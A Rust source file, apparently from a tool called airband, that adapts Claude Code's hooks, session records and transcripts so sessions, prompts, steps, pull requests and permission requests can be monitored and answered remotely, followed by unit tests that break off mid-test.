//! The Claude Code adapter. Claude Code runs `airband hook claude-code` from its own hooks (SessionStart, Stop,
//! Notification, UserPromptSubmit, SessionEnd, and PostToolUse for the tools that touch pictures) with the
//! hook's JSON on standard input.
use super::env;
use super::hooks::{On, on, text};
use airband_core::agent::{Agent, AgentEvent, Deliver, Event, PermissionAsk};
use serde_json::Value;

/// The name he gave this session, if he gave one: with `/rename`, or as the name of its remote control
/// (`/remote-control shop 2`). A title Claude Code made up by itself is not used: those go stale.
fn session_name(hook: &Value) -> Option<String> {
    let home = std::path::PathBuf::from(env("HOME")?);
    // Claude Code keeps one small file per running session, by process
    let renamed = env("CLAUDE_PID")
        .and_then(|pid| std::fs::read_to_string(home.join(".claude/sessions").join(format!("{pid}.json"))).ok())
        .and_then(|text| serde_json::from_str::<Value>(&text).ok())
        .filter(|s| s["nameSource"].as_str() == Some("user") && s["sessionId"].as_str() == hook["session_id"].as_str())
        .and_then(|s| s["name"].as_str().map(str::trim).filter(|n| !n.is_empty()).map(String::from));
    renamed.or_else(|| remote_control_name(hook["transcript_path"].as_str()?, hook["session_id"].as_str()?))
}

/// The name last given to `/remote-control` in this session. It is only in the transcript, which can be tens of
/// megabytes, so the place reached and the name found are kept beside the tower's files and each call reads
/// only what has been written since.
fn remote_control_name(transcript: &str, session: &str) -> Option<String> {
    if !session.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-') {
        return None;
    }
    let note = crate::config::dir().join("claude-code").join(format!("{session}.json"));
    let kept: Value = airband_core::kept::load(&note).unwrap_or(Value::Null);
    let (mut at, mut name) = (kept["at"].as_u64().unwrap_or(0), kept["name"].as_str().map(String::from));
    let file = std::fs::File::open(transcript).ok()?;
    let len = file.metadata().ok()?.len();
    if len < at {
        at = 0; // the transcript was replaced
    }
    if len > at {
        at = whole_lines(file, at, |line| {
            if let Some(found) = remote_control_line(line) {
                name = Some(found);
            }
        })?;
        let _ = airband_core::kept::save(&note, &serde_json::json!({ "at": at, "name": name }));
    }
    name
}

/// The kind of link (`catalog/links`) a pull request is.
const PULL_KIND: &str = "pull-request";

/// The pull requests this session has opened since the last look. Claude Code writes one line into the
/// session's transcript for each (`pr-link`: its address, its number and the repository), which is what its
/// own screen shows them from. The place reached is kept beside the tower's files, so each is reported once.
/// On the first look at a session nothing is reported: what its transcript already holds was made before
/// anyone was watching.
fn pull_requests(hook: &Value) -> Vec<Event> {
    let (Some(transcript), Some(session)) = (hook["transcript_path"].as_str(), hook["session_id"].as_str()) else { return Vec::new() };
    if !session.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-') {
        return Vec::new();
    }
    let note = crate::config::dir().join("claude-code").join(format!("{session}.made.json"));
    // A session that has written nothing yet has no transcript: everything it comes to hold was made while
    // the tower was watching, so the place reached is its start.
    let Ok(file) = std::fs::File::open(transcript) else {
        if !std::path::Path::new(transcript).exists() {
            let _ = airband_core::kept::save(&note, &serde_json::json!({ "at": 0 }));
        }
        return Vec::new();
    };
    let len = file.metadata().map(|m| m.len()).unwrap_or(0);
    let reached = airband_core::kept::load::<Value>(&note).and_then(|kept| kept["at"].as_u64()).filter(|at| *at <= len);
    let mut found: Vec<Event> = Vec::new();
    let at = match reached {
        Some(at) => whole_lines(file, at, |line| {
            if let Some(made) = pull_request_line(line).filter(|made| !found.contains(made)) {
                found.push(made);
            }
        })
        .unwrap_or(at),
        None => len,
    };
    let _ = airband_core::kept::save(&note, &serde_json::json!({ "at": at }));
    found
}

/// The pull request one transcript line records, when the line is Claude Code's own record of one. Such a
/// record is a short line; the long ones (a request, a tool's output) are not read at all.
fn pull_request_line(line: &[u8]) -> Option<Event> {
    if line.len() > 4096 {
        return None;
    }
    let entry: Value = serde_json::from_slice(line).ok()?;
    if entry["type"].as_str() != Some("pr-link") {
        return None;
    }
    let address = entry["prUrl"].as_str().filter(|a| airband_core::links::secure(a))?;
    let title = entry["prRepository"].as_str().zip(entry["prNumber"].as_u64()).map(|(repository, number)| format!("{repository} #{number}"));
    Some(Event::Made { address: address.to_string(), title, kind: Some(PULL_KIND.to_string()) })
}

/// Read a transcript's lines from a place in it onward, handing each whole line to `each`, and say how far
/// that got. A line still being written is left for next time, and so is whatever follows a part that could
/// not be read. Nothing when the place could not be gone to.
fn whole_lines(mut file: std::fs::File, from: u64, mut each: impl FnMut(&[u8])) -> Option<u64> {
    use std::io::{BufRead, Seek, SeekFrom};
    file.seek(SeekFrom::Start(from)).ok()?;
    let mut lines = std::io::BufReader::with_capacity(64 * 1024, file);
    let (mut at, mut line) = (from, Vec::new());
    loop {
        line.clear();
        let n = lines.read_until(b'\n', &mut line).unwrap_or(0);
        if n == 0 || line.last() != Some(&b'\n') {
            return Some(at);
        }
        at += n as u64;
        each(&line);
    }
}

/// The name in one transcript line, if that line is Claude Code's own record of him running
/// `/remote-control <name>`: an entry of its own kind with the command and what he gave it as fields
/// (`commandRun`). Nothing is read out of a line's words, so one that only quotes such a command is not one.
fn remote_control_line(line: &[u8]) -> Option<String> {
    // a quick look before parsing: transcripts run to tens of megabytes
    const MARK: &[u8] = b"\"commandRun\"";
    if !line.windows(MARK.len()).any(|w| w == MARK) {
        return None;
    }
    let entry: Value = serde_json::from_slice(line).ok()?;
    if entry["type"].as_str() != Some("system") || entry["subtype"].as_str() != Some("local_command") || entry["commandRun"]["command"].as_str() != Some("remote-control") {
        return None;
    }
    let args = entry["commandRun"]["args"].as_str()?.trim();
    (!args.is_empty() && args.len() <= 60).then(|| args.to_string())
}

/// Who a notification is about: the session, where it works, how to reach it, and the name he gave it.
fn agent_of(hook: &Value) -> Option<Agent> {
    Some(Agent {
        id: text(hook, "session_id")?,
        harness: "claude-code".into(),
        cwd: text(hook, "cwd"),
        name: env("AIRBAND_NAME"),
        // one the tower holds keeps the name it has: a session carried on in a new process comes with a name of
        // the harness's own making, which is not one he gave it
        title: if env("AIRBAND_HELD").is_some() { None } else { session_name(hook) },
        pid: env("CLAUDE_PID").and_then(|p| p.parse().ok()),
        // one the tower started and holds is reached through the input it holds, and no other way
        deliver: if env("AIRBAND_HELD").is_some() { Some(Deliver::Held) } else { env("CLAUDE_CODE_MESSAGING_SOCKET").map(|s| Deliver::Socket { path: s.trim_start_matches("uds:").to_string(), token: env("CLAUDE_CODE_MESSAGING_TOKEN") }) },
        // where its transcript is, so the tower can ask what it is doing without a hook on every step
        meta: text(hook, "transcript_path").map(|t| serde_json::Map::from_iter([("transcript".to_string(), Value::String(t))])).unwrap_or_default(),
    })
}

/// Is the process a session's record names still that session? Its number alone could have been given to
/// another program since; the moment it started could not.
fn running(pid: u32, started: &str) -> bool {
    #[cfg(unix)]
    {
        // as Claude Code writes it: in English, by the clock at Greenwich
        let Ok(out) = std::process::Command::new("ps").args(["-p", &pid.to_string(), "-o", "lstart="]).env("LC_ALL", "C").env("TZ", "UTC").output() else { return false };
        let words = |t: &str| t.split_whitespace().collect::<Vec<_>>().join(" ");
        out.status.success() && !started.trim().is_empty() && words(&String::from_utf8_lossy(&out.stdout)) == words(started)
    }
    #[cfg(not(unix))]
    {
        let _ = (pid, started);
        false
    }
}

/// The sessions he has open in a terminal, from the record Claude Code keeps of each while it runs
/// (`sessions/<process>.json` in its folder: the session, its folder, the socket it takes messages on) and
/// the token for that socket beside it. A one-off run (`claude -p`) and a session another program drives
/// have a record too, with another `entrypoint`: those are not his to talk to and are left out.
fn open_in(claude: &std::path::Path, running: &dyn Fn(u32, &str) -> bool) -> Option<Vec<super::Open>> {
    let dir = claude.join("sessions");
    let read = |path: &std::path::Path| std::fs::read(path).ok().and_then(|b| serde_json::from_slice::<Value>(&b).ok());
    let files: Vec<std::path::PathBuf> = std::fs::read_dir(&dir).ok()?.flatten().map(|f| f.path()).collect();
    let mut open = Vec::new();
    for path in files.iter().filter(|p| p.extension().is_some_and(|e| e == "json")) {
        let Some(v) = read(path) else { continue };
        let field = |k: &str| text(&v, k);
        if v["kind"] != "interactive" || v["entrypoint"] != "cli" {
            continue;
        }
        let (Some(pid), Some(id), Some(socket), Some(started)) = (v["pid"].as_u64().map(|p| p as u32), field("sessionId"), field("messagingSocketPath"), field("procStart")) else { continue };
        if !running(pid, &started) {
            continue;
        }
        // the token its socket asks for: in a file of that process's, written when the same process started
        let key = files.iter().filter(|p| p.extension().is_some_and(|e| e == "key") && p.file_name().is_some_and(|n| n.to_string_lossy().split('.').next() == Some(pid.to_string().as_str()))).find_map(|p| read(p).filter(|k| k["procStart"].as_str().map(str::trim) == Some(started.as_str())));
        let token = key.and_then(|k| k["peerToken"].as_str().filter(|t| !t.is_empty()).map(String::from));
        let transcript = transcript_of(claude, &id);
        open.push(super::Open {
            agent: Agent {
                harness: "claude-code".into(),
                cwd: field("cwd"),
                name: None,
                // a name he gave it; one Claude Code made up is not used
                title: field("name").filter(|_| v["nameSource"] == "user"),
                pid: Some(pid),
                deliver: Some(Deliver::Socket { path: socket, token }),
                meta: transcript.map(|t| serde_json::Map::from_iter([("transcript".to_string(), Value::String(t))])).unwrap_or_default(),
                id,
            },
            idle: v["status"] == "idle",
        });
    }
    Some(open)
}

/// Where a session's transcript is: the file named for the session, in one of the folders Claude Code keeps
/// per project.
fn transcript_of(claude: &std::path::Path, session: &str) -> Option<String> {
    if !session.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-') {
        return None;
    }
    std::fs::read_dir(claude.join("projects")).ok()?.flatten().map(|d| d.path().join(format!("{session}.jsonl"))).find(|p| p.is_file()).map(|p| p.display().to_string())
}

/// The folders Claude Code has had sessions in: it keeps a folder of transcripts for each, and a transcript
/// says on its lines which folder the session was in. The newest transcript of each is asked, and only its
/// first lines are read.
fn worked_in(claude: &std::path::Path) -> Vec<super::Worked> {
    use std::io::BufRead;
    let Ok(projects) = std::fs::read_dir(claude.join("projects")) else { return Vec::new() };
    let found = projects.flatten().filter_map(|project| {
        let newest = std::fs::read_dir(project.path()).ok()?.flatten().map(|f| f.path()).filter(|p| p.extension().is_some_and(|e| e == "jsonl")).map(|p| (super::written(&p), p)).max_by_key(|(at, _)| *at)?;
        let lines = std::io::BufReader::new(std::fs::File::open(&newest.1).ok()?).lines();
        let folder = lines.take(40).map_while(Result::ok).find_map(|line| serde_json::from_str::<Value>(&line).ok()?["cwd"].as_str().filter(|c| !c.is_empty()).map(String::from))?;
        Some(super::Worked { folder, at: newest.0 })
    });
    super::newest(found)
}

/// A look at a session, from the end of its transcript: what it is doing right now, in its own words for its
/// latest step, and the model and effort its latest answer was made with. A command or a subagent comes with a
/// description Claude wrote for it ("Run the payments tests"); for the rest, a few plain words. Reads at most
/// the last 96 KB of the file, so it is quick however long the session.
pub fn glance(agent: &Agent) -> super::Glance {
    let Some(tail) = tail_of(agent, 96 * 1024) else { return super::Glance::default() };
    let (model, effort) = engine_in(&tail).unzip();
    super::Glance { doing: step_in(&tail), model, effort: effort.flatten() }
}

/// The end of a session's transcript: at most this many bytes of it.
fn tail_of(agent: &Agent, most: u64) -> Option<String> {
    use std::io::{Read, Seek, SeekFrom};
    let mut file = std::fs::File::open(agent.meta.get("transcript")?.as_str()?).ok()?;
    let size = file.metadata().ok()?.len();
    file.seek(SeekFrom::Start(size.saturating_sub(most))).ok()?;
    let mut tail = Vec::new();
    file.read_to_end(&mut tail).ok()?;
    Some(String::from_utf8_lossy(&tail).into_owned())
}

/// What he has typed into a session since the byte `from` of its transcript, and the byte to read from next
/// time. The first time, at most the last 24 MB are gone through: a line with a pasted picture in it runs to
/// hundreds of kilobytes. The file is read a line at a time and only his own lines are kept, so this costs the
/// memory of one line however much there is to go through. Whole lines only: one still being written is left
/// for the next call.
pub fn told(agent: &Agent, from: u64) -> (Vec<super::Told>, u64) {
    let read = || {
        let file = std::fs::File::open(agent.meta.get("transcript")?.as_str()?).ok()?;
        let size = file.metadata().ok()?.len();
        // the transcript was replaced by a shorter one: start over; what was already taken is known by its id
        let from = if from > size { 0 } else { from };
        let fresh = from == 0 && size > 24 * 1024 * 1024;
        let start = if fresh { size - 24 * 1024 * 1024 } else { from };
        let mut told = Vec::new();
        // started in the middle of the file: what is left of the line it landed in is not a line
        let mut skip = fresh;
        let at = whole_lines(file, start, |line| {
            let wanted = |mark: &[u8]| line.windows(mark.len()).any(|w| w == mark);
            if !std::mem::take(&mut skip) && (wanted(b"\"human\"") || wanted(b"\"peer\"") || wanted(b"\"sdk\"")) {
                told.extend(told_in(&String::from_utf8_lossy(line)));
            }
        })?;
        Some((told, at))
    };
    read().unwrap_or((Vec::new(), from))
}

/// His own prompts in a piece of a transcript, oldest first: one that started a turn, and one he sent while the
/// session was working. Claude Code marks who each prompt came from; only "human" is him at the keyboard.
fn told_in(piece: &str) -> Vec<super::Told> {
    let words = |content: &Value| -> Option<String> {
        let text = match content {
            Value::String(s) => s.clone(),
            Value::Array(parts) => parts.iter().filter(|p| p["type"] == "text").filter_map(|p| p["text"].as_str()).collect::<Vec<_>>().join("\n"),
            _ => return None,
        };
        let text = text.trim().to_string();
        // whose words they are is settled below, by who Claude Code says the prompt came from: a command of
        // its own and that command's output carry no such mark
        (!text.is_empty()).then_some(text)
    };
    piece
        .lines()
        .filter(|l| l.contains("\"human\"") || l.contains("\"peer\"") || l.contains("\"sdk\""))
        .filter_map(|line| {
            let entry: Value = serde_json::from_str(line).ok()?;
            if entry["isSidechain"] == true || entry["isMeta"] == true {
                return None;
            }
            // pictures he pasted in with it
            let images: Vec<Vec<u8>> = entry["message"]["content"]
                .as_array()
                .map(|parts| {
                    use base64::Engine;
                    parts.iter().filter(|p| p["type"] == "image" && p["source"]["type"] == "base64").filter_map(|p| base64::engine::general_purpose::STANDARD.decode(p["source"]["data"].as_str()?).ok()).take(4).collect()
                })
                .unwrap_or_default();
            let (from, id, text) = match entry["type"].as_str()? {
                // a picture by itself is still something he gave it
                "user" => (&entry, entry["uuid"].as_str()?, words(&entry["message"]["content"]).or_else(|| (!images.is_empty()).then(String::new))?),
                "attachment" if entry["attachment"]["type"] == "queued_command" => (&entry["attachment"], entry["attachment"]["source_uuid"].as_str().or(entry["uuid"].as_str())?, words(&entry["attachment"]["prompt"])?),
                _ => return None,
            };
            // typed by him; or left for it from outside (a message the tower passed on arrives so), or given to
            // it as its input by whoever runs it (the tower, for one it holds): those it has now taken in
            let of = |kind: &str| from["origin"]["kind"] == kind || entry["origin"]["kind"] == kind;
            let his = of("human");
            if !his && !of("peer") && entry["promptSource"] != "sdk" {
                return None;
            }
            let at = from["timestamp"].as_str().or(entry["timestamp"].as_str()).and_then(super::claude_accounts::iso_ms)?;
            Some(super::Told { id: id.to_string(), at, text, images: if his { images } else { Vec::new() }, his })
        })
        .collect()
}

/// The files a session has lately read or changed and the commands it has run, newest first, as written.
pub fn touched(agent: &Agent) -> Vec<String> {
    tail_of(agent, 256 * 1024).map(|tail| touched_in(&tail)).unwrap_or_default()
}

fn touched_in(tail: &str) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    for line in tail.lines().rev().filter(|l| l.contains("\"tool_use\"")) {
        let Ok(entry) = serde_json::from_str::<Value>(line) else { continue };
        if entry["isSidechain"] == true {
            continue;
        }
        for c in entry["message"]["content"].as_array().into_iter().flatten().rev().filter(|c| c["type"] == "tool_use") {
            let input = &c["input"];
            let what = ["file_path", "notebook_path", "path", "command"].iter().find_map(|k| input[*k].as_str()).map(|t| t.lines().next().unwrap_or("").trim().chars().take(160).collect::<String>());
            if let Some(what) = what.filter(|w| !w.is_empty() && !found.contains(w)) {
                found.push(what);
            }
            if found.len() >= 14 {
                return found;
            }
        }
    }
    found
}

/// The model and effort of the latest answer in a piece of a transcript. A subagent's lines are passed over: it
/// may run on another model.
fn engine_in(tail: &str) -> Option<(String, Option<String>)> {
    tail.lines().rev().filter(|l| l.contains("\"model\"") && l.contains("\"assistant\"")).find_map(|line| {
        let entry: Value = serde_json::from_str(line).ok()?;
        if entry["type"] != "assistant" || entry["isSidechain"] == true {
            return None;
        }
        let model = model_name(entry["message"]["model"].as_str()?)?;
        Some((model, entry["effort"].as_str().map(str::trim).filter(|e| !e.is_empty()).map(str::to_string)))
    })
}

/// What a model is called, from its id: the name its row gives it (`model_names` in the tool's row). An id the
/// row does not have is shown as it is written. Nothing for what the row lists as no model at all: the value
/// Claude Code writes on a line it made itself.
fn model_name(id: &str) -> Option<String> {
    let rows = airband_core::catalog::built();
    let row = rows.tools.iter().find(|t| t.id == "claude-code")?;
    if row.with.get("not_models").and_then(Value::as_array).is_some_and(|none| none.iter().any(|n| n.as_str() == Some(id))) {
        return None;
    }
    Some(row.with.get("model_names").and_then(|names| names.get(id)).and_then(Value::as_str).unwrap_or(id).to_string())
}

/// The latest step named in a piece of a transcript, newest line first.
fn step_in(tail: &str) -> Option<String> {
    tail.lines().rev().filter(|l| l.contains("\"tool_use\"")).find_map(|line| {
        let entry: Value = serde_json::from_str(line).ok()?;
        entry["message"]["content"].as_array()?.iter().rev().filter(|c| c["type"] == "tool_use").find_map(|c| step(c["name"].as_str()?, &c["input"]))
    })
}

/// Every step a session has taken since `since`, oldest first. From the end of its transcript only: a turn
/// longer than that reaches back is told by its later steps.
pub fn steps(agent: &Agent, since: u64) -> Vec<String> {
    tail_of(agent, 1024 * 1024).map(|tail| steps_in(&tail, since)).unwrap_or_default()
}

fn steps_in(tail: &str, since: u64) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    for line in tail.lines().filter(|l| l.contains("\"tool_use\"")) {
        let Ok(entry) = serde_json::from_str::<Value>(line) else { continue };
        if entry["isSidechain"] == true || entry["timestamp"].as_str().and_then(super::claude_accounts::iso_ms).is_none_or(|at| at < since) {
            continue;
        }
        for part in entry["message"]["content"].as_array().into_iter().flatten().filter(|c| c["type"] == "tool_use") {
            if let Some(label) = part["name"].as_str().and_then(|name| step(name, &part["input"])) {
                // the same label twice running is one step said twice
                if found.last() != Some(&label) {
                    found.push(label);
                }
            }
        }
    }
    let most = 80;
    if found.len() > most { found.split_off(found.len() - most) } else { found }
}

fn step(tool: &str, input: &Value) -> Option<String> {
    let text = |k: &str| input[k].as_str().map(str::trim).filter(|t| !t.is_empty());
    // what the row says of this tool of Claude Code's own
    let row = super::hooks::tool_use(NAME_ROW, tool);
    let said = if row["bookkeeping"].as_bool() == Some(true) {
        // bookkeeping of its own, not a step in the work: keep looking further back
        return None;
    } else if let Some(said) = text("description") {
        said.to_string()
    } else if !row.is_null() {
        super::hooks::fill(&row["doing"], input)?
    } else {
        // a tool from a server, named by Claude Code as server and tool with its row's mark between: the
        // tool's own name, as words ("take screenshot")
        let mark = super::row_says(NAME_ROW, "server_tool");
        let own = if mark.is_empty() { tool } else { tool.rsplit(mark.as_str()).next().unwrap_or(tool) };
        own.replace(['_', '-'], " ")
    };
    let said: String = said.split_whitespace().collect::<Vec<_>>().join(" ");
    Some(if said.chars().count() > 64 { format!("{}…", said.chars().take(63).collect::<String>().trim_end()) } else { said }).filter(|s| !s.is_empty())
}

/// Claude Code is about to show a permission prompt (its `PermissionRequest` hook): the request to put to him.
/// What he reads is the thing itself, not a description of it: the command, the file, the address.
pub fn permission(hook: &Value) -> Option<PermissionAsk> {
    if hook["hook_event_name"].as_str() != Some("PermissionRequest") {
        return None;
    }
    // scripts calling `claude -p` have nobody waiting on them
    if env("CLAUDE_CODE_ENTRYPOINT").as_deref() == Some("sdk-cli") && env("AIRBAND_INCLUDE_HEADLESS").is_none() && env("AIRBAND_HELD").is_none() {
        return None;
    }
    let tool = hook["tool_name"].as_str().unwrap_or("a tool");
    let input = &hook["tool_input"];
    // whole, never cut: what he reads is what will run
    let row = super::hooks::tool_use(NAME_ROW, tool);
    let what = super::hooks::fill(&row["asks"], input).unwrap_or_else(|| format!("use {tool}"));
    // Its tool for asking him something is not a thing to allow: it is a question, put to him as one. One
    // question comes with the answers it offered; several are put together, for him to answer in his own words.
    let question = (row["role"].as_str() == Some("question")).then(|| {
        let asked: Vec<&Value> = input["questions"].as_array().into_iter().flatten().collect();
        let text = asked.iter().filter_map(|q| q["question"].as_str()).map(str::trim).collect::<Vec<_>>().join("\n\n");
        let choices = match asked.as_slice() {
            [one] => one["options"].as_array().into_iter().flatten().filter_map(|o| o["label"].as_str()).map(|l| l.trim().to_string()).filter(|l| !l.is_empty()).collect(),
            _ => Vec::new(),
        };
        airband_core::agent::Asked { text, choices }
    })
    .filter(|q| !q.text.is_empty());
    // one too long to put in front of him whole is not asked on the phone: Claude Code asks at its keyboard
    super::hooks::leave(agent_of(hook)?, tool, what, input, " The rest is at the keyboard.", question)
}

/// Which part of Claude Code's this tool call is, as its row has it.
fn role(hook: &Value) -> Option<String> {
    super::hooks::tool_use(NAME_ROW, hook["tool_name"].as_str()?)["role"].as_str().map(String::from)
}
/// Is this tool call Claude Code starting a subagent?
fn is_subagent(hook: &Value) -> bool {
    role(hook).as_deref() == Some("subagent")
}

/// The files Claude Code's own tool for handing him a file was given: its `files` field, a list of paths.
/// Whether one is a picture is found out from the file itself, when the tower makes its copy.
fn files_sent(hook: &Value) -> Vec<String> {
    let cwd = hook["cwd"].as_str();
    hook["tool_input"]["files"]
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .map(|s| {
            let path = std::path::Path::new(s);
            if path.is_absolute() { path.to_path_buf() } else { std::path::Path::new(cwd.unwrap_or(".")).join(path) }
        })
        .filter(|path| path.is_file())
        .map(|path| path.display().to_string())
        .collect()
}

/// Claude Code: installed for SessionStart, Stop, Notification, UserPromptSubmit and SessionEnd, and after the
/// tools that look at or hand over a picture.
pub fn events(hook: &Value) -> Vec<AgentEvent> {
    // scripts calling `claude -p` have nobody waiting on them
    if env("CLAUDE_CODE_ENTRYPOINT").as_deref() == Some("sdk-cli") && env("AIRBAND_INCLUDE_HEADLESS").is_none() && env("AIRBAND_HELD").is_none() {
        return Vec::new();
    }
    let events = super::hooks::session_events(hook).unwrap_or_else(|| match hook["hook_event_name"].as_str() {
        // the notice that it has been idle only repeats the Stop that came just before it. Claude Code says
        // which kind a notice is; none is told from its wording.
        Some("Notification") => match text(hook, "message") {
            Some(message) if hook["notification_type"].as_str() != Some("idle_prompt") => vec![Event::Notice { text: message }],
            _ => Vec::new(),
        },
        // it is handing part of the work to a subagent
        Some("PreToolUse") if is_subagent(hook) => vec![Event::Subagent { done: false, what: hook["tool_input"]["description"].as_str().unwrap_or("").to_string() }],
        Some("PostToolUse") if is_subagent(hook) => vec![Event::Subagent { done: true, what: hook["tool_input"]["description"].as_str().unwrap_or("").to_string() }],
        // it sent him a file
        Some("PostToolUse") if role(hook).as_deref() == Some("files") => files_sent(hook).into_iter().map(|path| Event::Picture { path, shown: true }).collect(),
        // it published a page: the tool's own answer says where it is and what it is called
        Some("PostToolUse") if role(hook).as_deref() == Some("artifact") => made_artifact(hook).into_iter().collect(),
        _ => Vec::new(),
    });
    // what its turn made that Claude Code wrote down itself comes first, so it goes with what the turn said
    let made = if matches!(hook["hook_event_name"].as_str(), Some("Stop" | "SessionStart")) { pull_requests(hook) } else { Vec::new() };
    super::hooks::from_agent(agent_of(hook), made.into_iter().chain(events).collect())
}

// ---- setting Claude Code up to report: its hooks, in its own settings file ----

/// The kind of link (`catalog/links`) a page published by Claude Code's tool for that is.
const ARTIFACT_KIND: &str = "claude-artifact";

/// The page the Artifact tool just published, from the tool's own answer. The tool says which of its actions
/// it was asked for (publishing is the one it does when none is named); reading a page, listing them or
/// adding a file to one publishes nothing.
fn made_artifact(hook: &Value) -> Option<Event> {
    let asked = &hook["tool_input"];
    if !matches!(asked["action"].as_str(), None | Some("publish")) || asked["asset"].as_bool() == Some(true) {
        return None;
    }
    let answer = &hook["tool_response"];
    let address = answer["url"].as_str().filter(|a| airband_core::links::secure(a))?;
    let title = answer["title"].as_str().map(str::trim).filter(|t| !t.is_empty()).map(String::from);
    Some(Event::Made { address: address.to_string(), title, kind: Some(ARTIFACT_KIND.to_string()) })
}

/// Where Claude Code keeps its settings and sessions, as its row has it.
fn claude_home() -> std::path::PathBuf {
    crate::config::home().join(super::row_says(NAME_ROW, "home"))
}
const NAME_ROW: &str = "claude-code";

/// The Claude Code tools worth hearing about once they have run, by its row: the one that hands him a file,
/// the one that publishes a page, and the one that runs a subagent.
fn after_tools() -> String {
    super::hooks::with_role(NAME_ROW, &["files", "artifact", "subagent"]).join("|")
}
/// The ones worth hearing about as they start: a subagent.
fn before_tools() -> String {
    super::hooks::with_role(NAME_ROW, &["subagent"]).join("|")
}
/// Permission is asked on the radio first. The time allowed is long because he is the one being waited for; the
/// tower says how long to wait and the hook gives up by itself well before this.
const HOOKS: &[On] = &[
    on("SessionStart", 5),
    on("Stop", 5),
    on("Notification", 5),
    on("UserPromptSubmit", 5),
    on("SessionEnd", 5),
    On { event: "PostToolUse", timeout: 5, only: Some(after_tools) },
    On { event: "PreToolUse", timeout: 5, only: Some(before_tools) },
    on("PermissionRequest", 900),
];

static ACCOUNTS: super::AccountBook = super::AccountBook { list: super::claude_accounts::list, switch: super::claude_accounts::switch, save: super::claude_accounts::save, add: super::claude_accounts::add, forget: super::claude_accounts::forget };

pub struct ClaudeCode;

impl super::Harness for ClaudeCode {
    fn name(&self) -> &'static str {
        "claude-code"
    }
    fn events(&self, hook: &Value) -> Vec<AgentEvent> {
        events(hook)
    }
    fn hooks(&self) -> Option<super::hooks::File> {
        Some(super::hooks::File { name: self.name(), path: claude_home().join("settings.json"), events: HOOKS })
    }
    fn permission(&self, hook: &Value) -> Option<PermissionAsk> {
        permission(hook)
    }
    fn accounts(&self) -> Option<&'static super::AccountBook> {
        Some(&ACCOUNTS)
    }
    fn glance(&self, agent: &Agent) -> super::Glance {
        glance(agent)
    }
    fn touched(&self, agent: &Agent) -> Vec<String> {
        touched(agent)
    }
    fn told(&self, agent: &Agent, from: u64) -> (Vec<super::Told>, u64) {
        told(agent, from)
    }
    fn steps(&self, agent: &Agent, since: u64) -> Vec<String> {
        steps(agent, since)
    }
    fn open(&self) -> Option<Vec<super::Open>> {
        open_in(&claude_home(), &running)
    }
    fn worked(&self) -> Vec<super::Worked> {
        worked_in(&claude_home())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn claude_code_stop_becomes_said() {
        let e = events(&json!({ "session_id": "s1", "cwd": "/x/shop", "hook_event_name": "Stop", "last_assistant_message": " Done. " })).remove(0);
        assert_eq!(e.agent.id, "s1");
        assert_eq!(e.event, Event::Said { text: "Done.".into(), kind: None, turn: None });
    }
    #[test]
    fn a_session_open_in_a_terminal_is_found_from_its_record_and_can_be_reached() {
        let claude = std::env::temp_dir().join(format!("airband-claude-{}", crate::config::random_hex(6)));
        let (sessions, project) = (claude.join("sessions"), claude.join("projects").join("-x-shop"));
        std::fs::create_dir_all(&sessions).unwrap();
        std::fs::create_dir_all(&project).unwrap();
        let record = |pid: u32, id: &str, more: Value| {
            let mut v = serde_json::json!({ "pid": pid, "sessionId": id, "cwd": "/x/shop", "procStart": format!("start {pid}"), "kind": "interactive", "entrypoint": "cli", "messagingSocketPath": format!("/tmp/cc-socks/{pid}.sock"), "name": "shop-a1", "nameSource": "derived", "status": "idle" });
            v.as_object_mut().unwrap().extend(more.as_object().unwrap().clone());
            std::fs::write(sessions.join(format!("{pid}.json")), v.to_string()).unwrap();
        };
        record(11, "open-one", serde_json::json!({}));
        std::fs::write(sessions.join("11.abc.key"), serde_json::json!({ "peerToken": "tok-11", "procStart": "start 11" }).to_string()).unwrap();
        std::fs::write(project.join("open-one.jsonl"), "{}\n").unwrap();
        // one he named, with a key file left by an earlier process of the same number
        record(12, "open-two", serde_json::json!({ "name": "shop removals", "nameSource": "user" }));
        std::fs::write(sessions.join("12.def.key"), serde_json::json!({ "peerToken": "stale", "procStart": "start long ago" }).to_string()).unwrap();
        // not his to talk to: a one-off run, one whose process has gone, one with no way in
        record(13, "one-off", serde_json::json!({ "entrypoint": "sdk-cli" }));
        record(14, "gone", serde_json::json!({}));
        record(15, "no-way-in", serde_json::json!({ "messagingSocketPath": "" }));
        let running = |pid: u32, started: &str| pid != 14 && started == format!("start {pid}");
        let mut open = open_in(&claude, &running).unwrap();
        open.sort_by(|a, b| a.agent.id.cmp(&b.agent.id));
        let ids: Vec<&str> = open.iter().map(|o| o.agent.id.as_str()).collect();
        assert_eq!(ids, ["open-one", "open-two"]);
        let one = &open[0].agent;
        assert_eq!((one.harness.as_str(), one.cwd.as_deref(), one.pid, one.title.as_deref()), ("claude-code", Some("/x/shop"), Some(11), None));
        assert_eq!(one.deliver, Some(Deliver::Socket { path: "/tmp/cc-socks/11.sock".into(), token: Some("tok-11".into()) }));
        assert_eq!(one.meta.get("transcript").and_then(Value::as_str), Some(project.join("open-one.jsonl").display().to_string().as_str()));
        let two = &open[1].agent;
        assert_eq!(two.title.as_deref(), Some("shop removals"));
        assert_eq!(two.deliver, Some(Deliver::Socket { path: "/tmp/cc-socks/12.sock".into(), token: None }));
        // with no record kept at all, Claude Code cannot say what is open: nothing is signed off on that
        assert!(open_in(&claude.join("nowhere"), &running).is_none());
        let _ = std::fs::remove_dir_all(&claude);
    }

    #[test]
    fn where_claude_code_has_worked_is_read_from_the_newest_transcript_of_each_project() {
        let claude = std::env::temp_dir().join(format!("airband-claude-{}", crate::config::random_hex(6)));
        let line = |cwd: &str| format!("{}\n{}\n", serde_json::json!({ "type": "queue-operation" }), serde_json::json!({ "type": "user", "cwd": cwd }));
        for (project, file, cwd) in [("-x-shop", "a.jsonl", "/x/shop"), ("-x-shop", "b.jsonl", "/x/shop"), ("-x-garden", "c.jsonl", "/x/garden")] {
            std::fs::create_dir_all(claude.join("projects").join(project)).unwrap();
            std::fs::write(claude.join("projects").join(project).join(file), line(cwd)).unwrap();
        }
        // a project folder with no transcript in it says nothing
        std::fs::create_dir_all(claude.join("projects").join("-x-empty")).unwrap();
